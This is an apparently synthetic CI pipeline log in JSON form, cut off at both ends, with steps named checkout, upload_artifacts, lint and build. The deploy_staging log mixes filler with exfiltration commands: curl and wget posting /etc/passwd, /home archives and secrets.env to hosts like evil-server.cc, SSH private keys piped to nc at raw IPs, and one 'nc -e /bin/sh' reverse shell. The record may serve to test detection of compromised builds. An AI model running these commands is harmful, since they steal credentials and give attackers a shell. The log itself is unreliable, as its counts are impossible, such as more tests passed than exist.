miss for key-2839\nnpm notice: package.json updated\n[12:47:23] INFO: Processing request\nCompiling src/handler.rs...\n[12:47:23] WARN: Deprecated API usage\npip: Installing build dependencies...\nPlatform: win32-x64\nOK\nPOST /data - 201 (396ms)\nStep 13/23: Installing dependencies\nReady.\nnpm notice: created a lockfile\nBuilding Docker image...\npip install: Successfully installed axios-5.20\n[12:47:23] INFO: Starting build process\nUsing Python 3.12\nMinifying vendor.js\n\u2713 Task completed in 3075ms\nSwitched to branch 'hotfix/task-945'\nyarn add: Done in 9.22s\nCoverage: 77% statements, 96% branches\n[12:47:23] DEBUG: Loading configuration\n[12:47:23] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nNODE_ENV=production\nCompleted.\nBundling runtime.js\n[12:47:23] INFO: Starting build process\nnpm notice: created a lockfile\nWARNING: webpack has known vulnerabilities\nCompleted.\npip: Collecting jest\nCoverage: 100% statements, 83% branches\nCoverage: 97% statements, 94% branches\nTransforming 758 files...\nSuccess!\n[12:47:23] DEBUG: Loading configuration\nNODE_ENV=development\nSuccess!\nSnapshots: 5 passed, 27 total\nCache miss for key-8796\nStep 8/23: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 10/23: Deploying\nTests: 425 passed, 227 total\n[12:47:23] DEBUG: Loading configuration\nPulling image: node:18\n  PASS: integration/test_user_create.spec.js\nArtifact uploaded: build.tar.gz (14MB)\nFAILED: test_auth_login\npip: Installing build dependencies...\nCompiling lib/index.js...\nEnvironment: production\n[12:47:23] ERROR: Connection failed\nStep 13/24: Running migrations\n[12:47:23] INFO: Starting build process\nTests: 316 passed, 366 total\npip: Downloading webpack-5.13.tar.gz\n  PASS: test_user_create (451ms)\nLayer 6/13: COPY command\nRan 132 tests in 52s\nWARNING: eslint has known vulnerabilities\nnpm install: resolved 473 packages\nPulling image: node:latest\n\u2713 Task completed in 1603ms\nCoverage: 95% statements, 74% branches\nnpm install: added 438 packages\n[12:47:23] DEBUG: Initializing service\nSuccess!\nImage pulled successfully\nCompleted.\n\u2713 All checks passed\nVerifying...\n\u2713 Step 'checkout' succeeded\n[12:47:23] INFO: Cache refreshed\nPlatform: darwin-arm64\nOptimizing 46 modules...\nWaiting...\nnpm notice: package.json updated\npip: Downloading webpack-2.14.tar.gz\nRan 86 tests in 44s\n[12:47:23] DEBUG: Query executed in 53ms\nWARNING: webpack has known vulnerabilities\nCompiling components/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 819 files...\nPulling image: node:latest\nFAILED: test_auth_login\nCompiling components/utils.go...\n[12:47:23] WARN: Deprecated API usage\nOptimizing 97 modules...\n[12:47:23] INFO: Connecting to database\nNODE_ENV=development\nArtifact uploaded: dist.zip (79MB)\n[12:47:23] ERROR: Connection failed\nTransforming 882 files...\n[12:47:23] DEBUG: Connection pool: 9 active\nMinifying main.js\nCompleted.\nPushing to registry...\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (134ms)\n[12:47:23] DEBUG: Query executed in 39ms\n\u2713 All checks passed\nEnvironment: test\nStep 19/15: Building\nFinished.\nArtifact uploaded: build.tar.gz (22MB)\nCache saved successfully\nProcessing...\nDone.\n  PASS: unit/test_api_health.spec.js\npip: Installing build dependencies...\nCache hit for key-8675\nPulling image: node:18\n\u2713 lint completed\nBundling main.css\nCache hit for key-2194\nHEAD is now at 31391e2\nPulling image: node:18\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n=== Step type_check completed ===\n=== Step: deploy_staging ===\n[12:47:23] INFO: Cache refreshed\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nPushing to registry...\nPOST /upload - 200 (333ms)\nCompleted.\npip install: Successfully installed webpack-3.17\nUsing Node.js 19.14.10\n[12:47:23] ERROR: Connection failed\nStep 4/24: Building\n\u2713 build completed\nSuccess!\nnpm install: resolved 110 packages\n  PASS: integration/test_auth_login.spec.js\nOptimizing 93 modules...\nStep 6/20: Testing\nUploading artifact 'dist' (39 files)\nInstalling jest@3.6.6\nPlatform: win32-x64\npip: Collecting eslint\nArtifact downloaded: 23MB\nPushing to registry...\nSuccess!\nSending 258MB of data to malicious-pool.xyz\nCache saved successfully\nStep 8/19: Building\nEnvironment: test\n[12:47:23] DEBUG: Initializing service\nBundling styles.js\nCreating production build...\nUsing Python 3.9\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nEnvironment: development\nnpm install: added 331 packages\nnpm install: added 365 packages\nStep 14/15: Running migrations\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nPOST /data - 202 (377ms)\nRan 140 tests in 3s\nReady.\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\npip: Collecting axios\npip install: Successfully installed react-2.11\nStep 7/15: Installing dependencies\n[12:47:23] INFO: Request completed\nCache hit for key-8685\nCompiling src/app.ts...\npip: Collecting eslint\n\u2713 All checks passed\nSending 492MB of data to malicious-pool.xyz\nCompiling utils/main.py...\n\u2713 test completed\n[12:47:23] DEBUG: Memory usage: 1211MB\npip: Downloading axios-1.9.tar.gz\n[12:47:23] INFO: Cache refreshed\nWaiting...\nFinished.\n\u2717 build failed with exit code 22\nGenerating source maps...\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nPlatform: darwin-arm64\n[12:47:23] DEBUG: Initializing service\nStep 9/18: Running migrations\npip: Collecting express\nSnapshots: 20 passed, 12 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed prettier-1.11\nCreating production build...\nnpm install: resolved 1093 packages\nCache miss for key-1427\n\u2713 Task completed in 589ms\nnpm notice: created a lockfile\nSending 316MB of data to data-exfil.ru\nWaiting...\n  PASS: unit/test_api_health.spec.js\nSending 497MB of data to evil-server.cc\nSwitched to branch 'hotfix/task-439'\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nSending 458MB of data to malicious-pool.xyz\nSwitched to branch 'feature/task-369'\nVerifying...\nStep 12/18: Running migrations\nStep 15/18: Running migrations\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nCache saved successfully\nStep 9/19: Linting\nOptimizing 18 modules...\n[12:47:23] WARN: Deprecated API usage\nException: RuntimeError\nStep 20/20: Building\nSending 221MB of data to data-exfil.ru\n[12:47:23] WARN: Deprecated API usage\npip: Collecting express\nEnvironment: test\nCreating production build...\n[12:47:23] DEBUG: Loading configuration\nVerifying...\nCompiling src/utils.go...\nTests: 440 passed, 101 total\npip: Downloading axios-3.1.tar.gz\nLayer 3/8: COPY command\nInstalling prettier@1.15.8\n[12:47:23] DEBUG: Memory usage: 1211MB\nTransforming 116 files...\nGET /health - 201 (62ms)\nSnapshots: 47 passed, 12 total\nCompiling utils/handler.rs...\nWARNING: eslint has known vulnerabilities\nPlatform: linux-x64\n\u2713 build completed\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (95ms)\nStep 10/16: Building\nNODE_ENV=development\n[12:47:23] INFO: Request completed\nMinifying vendor.js\nArtifact downloaded: 40MB\nPulling image: python:latest\nOptimizing 85 modules...\n[12:47:23] DEBUG: Query executed in 100ms\nImage pulled successfully\necho $(cat ~/.ssh/id_rsa) | base64 | nc 235.205.169.38 25466\nWARNING: eslint has known vulnerabilities\n[12:47:23] DEBUG: Initializing service\nTransforming 899 files...\nPlatform: linux-x64\nSending 104MB of data to evil-server.cc\nVerifying...\nGET /api - 200 (94ms)\nCache restored successfully (267MB)\nHEAD is now at 00c7468\nCompleted.\n[12:47:23] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 157.250.173.132 44680\nSwitched to branch 'feature/task-322'\nTransforming 618 files...\n[12:47:23] DEBUG: Query executed in 45ms\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nTLS handshake completed\nDone.\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (76MB)\nFAILED: test_cache_hit\nOK\nCompiling src/app.ts...\nnpm install: resolved 1411 packages\nPushing to registry...\n[12:47:23] DEBUG: Connection pool: 3 active\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:23] WARN: Deprecated API usage\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nnc -e /bin/sh 132.5.66.198 55999\nOK\nEnvironment: production\nFinished.\nOptimizing 10 modules...\nTests: 53 passed, 325 total\nCompiling lib/app.ts...\nArtifact uploaded: build.tar.gz (50MB)\nSending 427MB of data to evil-server.cc\n[12:47:23] INFO: Processing request\n[12:47:23] INFO: Starting build process\nTLS handshake completed\n[12:47:23] INFO: Cache refreshed\nPlatform: darwin-arm64\n\u2717 build failed with exit code 88\nImage pulled successfully\n\u2713 Step 'install' succeeded\n\u2717 build failed with exit code 90\nChecking out master branch\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n[12:47:23] INFO: Connecting to database\nPOST /upload - 201 (71ms)\n[12:47:23] DEBUG: Initializing service\nnpm notice: created a lockfile\nConnection established\nnpm install: added 455 packages\n[12:47:23] DEBUG: Memory usage: 106MB\nNODE_ENV=test\nOK\nPulling image: node:18\nStep 6/19: Installing dependencies\n[12:47:23] WARN: Deprecated API usage\nGenerating source maps...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 186.149.115.234 55965\n[12:47:23] INFO: Processing request\nyarn add: Done in 18.64s\nCompiling lib/service.java...\nnpm notice: package.json updated\nTime: 7.862s\nTests: 393 passed, 244 total\nCache saved successfully\nCache restored successfully (185MB)\nArtifact uploaded: build.tar.gz (6MB)\nBuilding Docker image...\nCompleted.\nCache invalidated: dependencies\n[12:47:23] INFO: Cache refreshed\nStep 8/15: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTests: 499 passed, 183 total\nCompiling src/app.ts...\nProcessing...\nnpm notice: package.json updated\n  PASS: test_db_connect (268ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-25T12:47:23.786952",
        "finished_at": "2025-11-25T12:47:30.279243",
        "log_lines": [
          "=== Step: checkout ===",
          "Bundling runtime.js",
          "Artifact uploaded: dist.zip (62MB)",
          "Ran 118 tests in 4s",
          "Cache saved successfully",
          "Image pulled successfully",
          "Optimizing 12 modules...",
          "[12:47:23] DEBUG: Memory usage: 1625MB",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-8455",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "[12:47:23] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Test Suites: 43 passed, 33 total",
          "[12:47:23] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Minifying vendor.js",
          "Installing eslint@1.11.10",
          "Waiting...",
          "\u2713 Task completed in 899ms",
          "[12:47:23] DEBUG: Connection pool: 11 active",
          "[12:47:23] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "POST /upload - 201 (484ms)",
          "Environment: staging",
          "\u2713 Task completed in 4671ms",
          "Success!",
          "Processing...",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Step 4/15: Building",
          "Waiting...",
          "Compiling utils/service.java...",
          "GET /api - 201 (45ms)",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Using Node.js 18.1.10",
          "\u2713 All checks passed",
          "Cache hit for key-1891",
          "Loading...",
          "Pulling image: node:3.11",
          "Cache invalidated: build",
          "Step 11/19: Installing dependencies",
          "Snapshots: 39 passed, 4 total",
          "Success!",
          "Building Docker image...",
          "Done.",
          "pip: Downloading react-4.4.tar.gz",
          "npm install: resolved 261 packages",
          "Processing...",
          "pip: Downloading prettier-1.16.tar.gz",
          "Step 1/19: Running migrations",
          "Step 15/16: Building",
          "OK",
          "pip: Collecting eslint",
          "GET /health - 200 (26ms)",
          "Completed.",
          "[12:47:23] DEBUG: Query executed in 98ms",
          "[12:47:23] WARN: Deprecated API usage",
          "[12:47:23] ERROR: Connection failed",
          "npm install: added 50 packages",
          "Snapshots: 27 passed, 34 total",
          "Uploading artifact 'dist' (43 files)",
          "Done.",
          "pip: Installing build dependencies...",
          "Cache hit for key-1217",
          "WARNING: express has known vulnerabilities",
          "Success!",
          "pip: Collecting webpack",
          "Test Suites: 22 passed, 29 total",
          "[12:47:23] WARN: Deprecated API usage",
          "npm install: added 328 packages",
          "Creating production build...",
          "Artifact uploaded: dist.zip (54MB)",
          "\u2713 All checks passed",
          "yarn add: Done in 23.53s",
          "POST /data - 201 (433ms)",
          "TLS handshake completed",
          "Completed.",
          "Already up to date.",
          "Installing axios@5.16.3",
          "npm install: added 374 packages",
          "Exception: NullPointerException",
          "yarn add: Done in 5.57s",
          "[12:47:23] DEBUG: Query executed in 67ms",
          "[12:47:23] INFO: Connecting to database",
          "Coverage: 84% statements, 63% branches",
          "[12:47:23] INFO: Processing request",
          "Compiling lib/utils.go...",
          "pip: Collecting axios",
          "Ready.",
          "Cache miss for key-1266",
          "Cache miss for key-4321",
          "Installing react@2.8.3",
          "[12:47:23] INFO: Connecting to database",
          "Compiling src/handler.rs...",
          "Using Node.js 18.9.7",
          "[12:47:23] DEBUG: Connection pool: 19 active",
          "HEAD is now at 64f142f",
          "Cache hit for key-9795",
          "Cache invalidated: build",
          "Uploading artifact 'build' (3 files)",
          "Generating source maps...",
          "\u2713 Task completed in 696ms",
          "Finished.",
          "Transforming 739 files...",
          "HEAD is now at caabb42",
          "[12:47:23] DEBUG: Query executed in 80ms",
          "\u2713 Step 'build' succeeded",
          "Transforming 359 files...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "Uploading artifact 'build' (17 files)",
          "Installing webpack@4.16.2",
          "Installing react@3.17.7",
          "Using Python 3.11",
          "Optimizing 42 modules...",
          "Artifact downloaded: 14MB",
          "[12:47:23] DEBUG: Memory usage: 272MB",
          "Minifying vendor.js",
          "[12:47:23] INFO: Request completed",
          "Minifying vendor.js",
          "Cache restored successfully (430MB)",
          "Test Suites: 44 passed, 19 total",
          "[12:47:23] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 40",
          "Ran 116 tests in 24s",
          "Installing axios@2.18.7",
          "Creating production build...",
          "[12:47:23] DEBUG: Loading configuration",
          "Compiling lib/main.py...",
          "Compiling components/handler.rs...",
          "Environment: production",
          "Already up to date.",
          "Ready.",
          "Platform: win32-x64",
          "WARNING: prettier has known vulnerabilities",
          "\u2717 build failed with exit code 25",
          "Minifying vendor.js",
          "Done.",
          "OK",
          "Step 16/17: Building",
          "Compiling components/main.py...",
          "Artifact uploaded: dist.zip (63MB)",
          "yarn add: Done in 18.94s",
          "[12:47:23] DEBUG: Query executed in 73ms",
          "Pulling image: python:18",
          "Transforming 358 files...",
          "Step 16/25: Linting",
          "[12:47:23] INFO: Request completed",
          "yarn add: Done in 8.72s",
          "Generating source maps...",
          "Cache hit for key-7735",
          "Completed.",
          "OK",
          "Snapshots: 36 passed, 11 total",
          "[12:47:23] INFO: Processing request",
          "Compiling utils/utils.go...",
          "\u2713 validate completed",
          "Generating source maps...",
          "[12:47:23] ERROR: Connection failed",
          "Ready.",
          "Waiting...",
          "Step 14/24: Running migrations",
          "Cache restored successfully (453MB)",
          "Step 5/21: Linting",
          "npm install: added 200 packages",
          "[12:47:23] DEBUG: Loading configuration",
          "NODE_ENV=development",
          "Processing...",
          "Artifact downloaded: 22MB",
          "Step 7/18: Installing dependencies",
          "Using Node.js 14.16.5",
          "Step 7/24: Installing dependencies",
          "Coverage: 89% statements, 66% branches",
          "[12:47:23] INFO: Connecting to database",
          "Processing...",
          "Step 7/17: Linting",
          "npm install: resolved 548 packages",
          "Minifying main.js",
          "Test Suites: 7 passed, 15 total",
          "[12:47:23] DEBUG: Initializing service",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-25T12:47:30.279243",
        "finished_at": "2025-11-25T12:47:46.509971",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "Compiling src/app.ts...",
          "Artifact uploaded: dist.zip (72MB)",
          "Minifying main.js",
          "Fetching from https://pypi.org/package.json",
          "Generating source maps...",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: dist.zip (69MB)",
          "Step 17/22: Linting",
          "Test Suites: 34 passed, 22 total",
          "  PASS: unit/test_api_health.spec.js",
          "NODE_ENV=test",
          "[12:47:23] DEBUG: Loading configuration",
          "Verifying...",
          "WARNING: express has known vulnerabilities",
          "Switched to branch 'hotfix/task-500'",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Ready.",
          "Ran 117 tests in 50s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing eslint@4.9.7",
          "Step 5/21: Building",
          "[12:47:23] WARN: Deprecated API usage",
          "Checking out master branch",
          "Cache miss for key-9778",
          "Cache saved successfully",
          "Step 13/20: Deploying",
          "TLS handshake completed",
          "\u2713 Task completed in 1124ms",
          "Time: 19.830s",
          "[12:47:23] WARN: Deprecated API usage",
          "Step 10/18: Testing",
          "pip: Installing build dependencies...",
          "[12:47:23] INFO: Starting build process",
          "\u2713 lint completed",
          "npm install: added 270 packages",
          "HEAD is now at 3050a4d",
          "pip: Installing build dependencies...",
          "Cache hit for key-1475",
          "Installing react@2.14.0",
          "Finished.",
          "npm notice: created a lockfile",
          "Step 19/25: Testing",
          "Tests: 136 passed, 323 total",
          "Using Node.js 17.19.9",
          "Compiling utils/main.py...",
          "Finished.",
          "Artifact downloaded: 8MB",
          "Using Node.js 20.19.1",
          "HEAD is now at 6a914e7",
          "Ran 61 tests in 50s",
          "Done.",
          "Generating source maps...",
          "[12:47:23] WARN: Deprecated API usage",
          "npm install: resolved 1159 packages",
          "Cache restored successfully (13MB)",
          "HEAD is now at e2b0b35",
          "Done.",
          "FAILED: test_user_create",
          "Finished.",
          "npm notice: package.json updated",
          "Time: 13.473s",
          "Step 19/25: Linting",
          "Step 13/24: Running migrations",
          "Using Python 3.12",
          "Bundling main.css",
          "[12:47:23] DEBUG: Connection pool: 6 active",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "Platform: win32-x64",
          "[12:47:23] INFO: Processing request",
          "GET /api - 201 (31ms)",
          "Uploading artifact 'build' (22 files)",
          "Artifact uploaded: dist.zip (36MB)",
          "[12:47:23] DEBUG: Memory usage: 1312MB",
          "[12:47:23] DEBUG: Memory usage: 911MB",
          "Done.",
          "Already up to date.",
          "POST /api - 201 (323ms)",
          "[12:47:23] INFO: Connecting to database",
          "[12:47:23] DEBUG: Memory usage: 845MB",
          "Completed.",
          "Step 7/21: Deploying",
          "Switched to branch 'hotfix/task-204'",
          "Step 14/22: Deploying",
          "Using Node.js 15.11.4",
          "Ran 120 tests in 1s",
          "[12:47:23] WARN: Deprecated API usage",
          "POST /upload - 201 (491ms)",
          "\u2713 package completed",
          "\u2713 All checks passed",
          "  PASS: test_db_connect (432ms)",
          "Building Docker image...",
          "[12:47:23] DEBUG: Initializing service",
          "Already up to date.",
          "Cache hit for key-1449",
          "Using Python 3.9",
          "\u2713 package completed",
          "HEAD is now at 74592e2",
          "[12:47:23] WARN: Deprecated API usage",
          "Cache hit for key-7119",
          "Artifact downloaded: 36MB",
          "Compiling utils/main.py...",
          "Time: 70.545s",
          "\u2717 build failed with exit code 27",
          "Building Docker image...",
          "Cache miss for key-3386",
          "Checking out develop branch",
          "\u2713 All checks passed",
          "Snapshots: 7 passed, 5 total",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:47:23] INFO: Starting build process",
          "Processing...",
          "Test Suites: 40 passed, 40 total",
          "Step 20/20: Linting",
          "Step 2/25: Installing dependencies",
          "Using Node.js 15.3.1",
          "Coverage: 77% statements, 76% branches",
          "\u2713 Step 'checkout' succeeded",
          "POST /api - 201 (134ms)",
          "[12:47:23] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_db_connect (326ms)",
          "[12:47:23] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "TLS handshake completed",
          "Environment: staging",
          "Uploading artifact 'build' (7 files)",
          "Finished.",
          "Exception: NullPointerException",
          "Ran 29 tests in 30s",
          "Processing...",
          "POST /data - 201 (130ms)",
          "Step 16/22: Deploying",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Pushing to registry...",
          "Snapshots: 6 passed, 17 total",
          "Switched to branch 'bugfix/task-635'",
          "pip: Installing build dependencies...",
          "npm install: resolved 1233 packages",
          "Optimizing 59 modules...",
          "Platform: win32-x64",
          "Creating production build...",
          "\u2713 All checks passed",
          "Cache invalidated: build",
          "[12:47:23] WARN: Deprecated API usage",
          "[12:47:23] INFO: Processing request",
          "GET /health - 204 (72ms)",
          "Using Python 3.9",
          "Finished.",
          "Exception: TypeError",
          "Exception: TypeError",
          "Tests: 475 passed, 349 total",
          "  PASS: test_auth_login (232ms)",
          "[12:47:23] INFO: Processing request",
          "Building Docker image...",
          "Platform: win32-x64",
          "Pushing to registry...",
          "Minifying vendor.js",
          "Snapshots: 38 passed, 13 total",
          "Step 3/21: Deploying",
          "Step 9/16: Deploying",
          "Cache saved successfully",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "POST /api - 200 (392ms)",
          "[12:47:23] INFO: Processing request",
          "Pulling image: alpine:3.11",
          "Waiting...",
          "pip: Downloading express-4.4.tar.gz",
          "Ready.",
          "Artifact uploaded: dist.zip (43MB)",
          "[12:47:23] DEBUG: Initializing service",
          "  PASS: test_api_health (167ms)",
          "Step 5/22: Installing dependencies",
          "Cache invalidated: node_modules",
          "Cache miss for key-3397",
          "OK",
          "Snapshots: 7 passed, 35 total",
          "WARNING: prettier has known vulnerabilities",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-25T12:47:46.509971",
        "finished_at": "2025-11-25T12:48:02.740699",
        "log_lines": [
          "=== Step: lint ===",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (264MB)",
          "Step 16/24: Testing",
          "Step 19/17: Deploying",
          "pip: Downloading eslint-1.9.tar.gz",
          "\u2713 validate completed",
          "[12:47:23] INFO: Processing request",
          "Completed.",
          "TLS handshake completed",
          "Transforming 624 files...",
          "Fetching from https://docker.io/package.json",
          "pip install: Successfully installed lodash-4.0",
          "Cache invalidated: node_modules",
          "  PASS: test_db_connect (13ms)",
          "WARNING: axios has known vulnerabilities",
          "Compiling components/index.js...",
          "\u2713 All checks passed",
          "[12:47:23] DEBUG: Connection pool: 4 active",
          "[12:47:23] ERROR: Connection failed",
          "  PASS: e2e/test_auth_login.spec.js",
          "Ran 115 tests in 41s",
          "[12:47:23] INFO: Connecting to database",
          "pip install: Successfully installed react-2.9",
          "Processing...",
          "[12:47:23] INFO: Starting build process",
          "GET /health - 204 (52ms)",
          "  PASS: test_cache_hit (435ms)",
          "npm notice: package.json updated",
          "Tests: 213 passed, 226 total",
          "\u2713 test completed",
          "[12:47:23] INFO: Processing request",
          "[12:47:23] WARN: Deprecated API usage",
          "[12:47:23] DEBUG: Memory usage: 1046MB",
          "Step 20/20: Installing dependencies",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "[12:47:23] ERROR: Connection failed",
          "POST /data - 201 (82ms)",
          "Artifact uploaded: dist.zip (34MB)",
          "\u2713 Step 'test' succeeded",
          "yarn add: Done in 16.44s",
          "[12:47:23] DEBUG: Loading configuration",
          "Environment: test",
          "Minifying app.js",
          "pip: Installing build dependencies...",
          "[12:47:23] DEBUG: Query executed in 95ms",
          "\u2713 Task completed in 227ms",
          "[12:47:23] DEBUG: Connection pool: 10 active",
          "Minifying app.js",
          "Finished.",
          "npm install: resolved 1381 packages",
          "[12:47:23] ERROR: Connection failed",
          "npm notice: package.json updated",
          "[12:47:23] DEBUG: Initializing service",
          "Cache saved successfully",
          "Ready.",
          "Fetching from https://amazonaws.com/package.json",
          "Compiling utils/index.js...",
          "[12:47:23] ERROR: Connection failed",
          "pip install: Successfully installed eslint-5.11",
          "  PASS: e2e/test_db_connect.spec.js",
          "Cache hit for key-9950",
          "npm notice: created a lockfile",
          "Cache restored successfully (326MB)",
          "Success!",
          "[12:47:23] WARN: Deprecated API usage",
          "Snapshots: 12 passed, 7 total",
          "Done.",
          "Cache hit for key-1587",
          "Cache saved successfully",
          "Artifact downloaded: 46MB",
          "[12:47:23] INFO: Starting build process",
          "[12:47:23] DEBUG: Query executed in 22ms",
          "Step 13/25: Linting",
          "Creating production build...",
          "Transforming 244 files...",
          "Compiling components/utils.go...",
          "Pushing to registry...",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "Tests: 470 passed, 66 total",
          "Transforming 756 files...",
          "Already up to date.",
          "[12:47:23] WARN: Deprecated API usage",
          "yarn add: Done in 11.61s",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache saved successfully",
          "[12:47:23] DEBUG: Initializing service",
          "WARNING: eslint has known vulnerabilities",
          "Tests: 349 passed, 459 total",
          "\u2713 Step 'setup' succeeded",
          "\u2713 All checks passed",
          "Using Python 3.12",
          "FAILED: test_api_health",
          "[12:47:23] INFO: Processing request",
          "Pushing to registry...",
          "Step 18/17: Installing dependencies",
          "Time: 106.319s",
          "Artifact uploaded: build.tar.gz (10MB)",
          "pip: Downloading prettier-3.1.tar.gz",
          "Optimizing 83 modules...",
          "Pulling image: python:3.11",
          "Cache hit for key-9752",
          "WARNING: express has known vulnerabilities",
          "Exception: RuntimeError",
          "Pushing to registry...",
          "Pushing to registry...",
          "pip: Collecting react",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Ready.",
          "\u2717 build failed with exit code 35",
          "[12:47:23] INFO: Starting build process",
          "Connection established",
          "[12:47:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: integration/test_auth_login.spec.js",
          "Loading...",
          "npm notice: package.json updated",
          "Loading...",
          "Processing...",
          "[12:47:23] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Step 4/19: Running migrations",
          "Tests: 262 passed, 118 total",
          "[12:47:23] INFO: Cache refreshed",
          "WARNING: axios has known vulnerabilities",
          "Cache saved successfully",
          "Snapshots: 24 passed, 23 total",
          "Processing...",
          "Cache miss for key-6813",
          "[12:47:23] DEBUG: Memory usage: 106MB",
          "Step 19/25: Linting",
          "Compiling src/main.py...",
          "Cache invalidated: build",
          "GET /health - 200 (74ms)",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_cache_hit (289ms)",
          "Image pulled successfully",
          "Cache miss for key-2463",
          "OK",
          "Success!",
          "  PASS: test_api_health (288ms)",
          "Artifact downloaded: 18MB",
          "Platform: linux-x64",
          "Processing...",
          "Platform: win32-x64",
          "Uploading artifact 'coverage' (28 files)",
          "Verifying...",
          "pip: Downloading prettier-4.10.tar.gz",
          "Connection established",
          "yarn add: Done in 21.50s",
          "[12:47:23] DEBUG: Loading configuration",
          "Waiting...",
          "Time: 109.183s",
          "  PASS: test_cache_hit (67ms)",
          "Optimizing 32 modules...",
          "\u2717 build failed with exit code 105",
          "Image pulled successfully",
          "[12:47:23] INFO: Connecting to database",
          "Coverage: 100% statements, 74% branches",
          "Pushing to registry...",
          "\u2713 Task completed in 4290ms",
          "WARNING: express has known vulnerabilities",
          "Ready.",
          "npm install: resolved 666 packages",
          "Completed.",
          "Connection established",
          "npm install: added 227 packages",
          "Cache restored successfully (366MB)",
          "Bundling main.css",
          "Building Docker image...",
          "Switched to branch 'bugfix/task-138'",
          "Cache miss for key-6021",
          "[12:47:23] DEBUG: Connection pool: 12 active",
          "Verifying...",
          "Cache miss for key-5427",
          "Image pulled successfully",
          "Pulling image: python:3.11",
          "Environment: production",
          "[12:47:23] DEBUG: Query executed in 15ms",
          "[12:47:23] INFO: Cache refreshed",
          "Bundling runtime.js",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-25T12:48:02.740699",
        "finished_at": "2025-11-25T12:48:51.432883",
        "log_lines": [
          "=== Step: build ===",
          "Checking out master branch",
          "[12:47:23] DEBUG: Memory usage: 1747MB",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "Cache invalidated: dependencies",
          "Using Python 3.11",
          "pip: Collecting react",
          "POST /data - 201 (298ms)",
          "[12:47:23] INFO: Starting build process",
          "Compiling components/handler.rs...",
          "Step 7/25: Deploying",
          "  PASS: test_api_health (61ms)",
          "npm notice: package.json updated",
          "GET /api - 204 (74ms)",
          "Cache invalidated: dependencies",
          "Processing...",
          "Platform: linux-x64",
          "Compiling lib/app.ts...",
          "Pulling image: alpine:3.11",
          "[12:47:23] DEBUG: Loading configuration",
          "Step 12/25: Running migrations",
          "[12:47:23] WARN: Deprecated API usage",
          "[12:47:23] DEBUG: Query executed in 99ms",
          "[12:47:23] ERROR: Connection failed",
          "Step 9/18: Running migrations",
          "\u2713 Step 'checkout' succeeded",
          "Compiling utils/utils.go...",
          "[12:47:23] INFO: Processing request",
          "Environment: test",
          "[12:47:23] ERROR: Connection failed",
          "Generating source maps...",
          "[12:47:23] DEBUG: Initializing service",
          "POST /data - 200 (369ms)",
          "Compiling lib/service.java...",
          "Pushing to registry...",
          "Uploading artifact 'coverage' (17 files)",
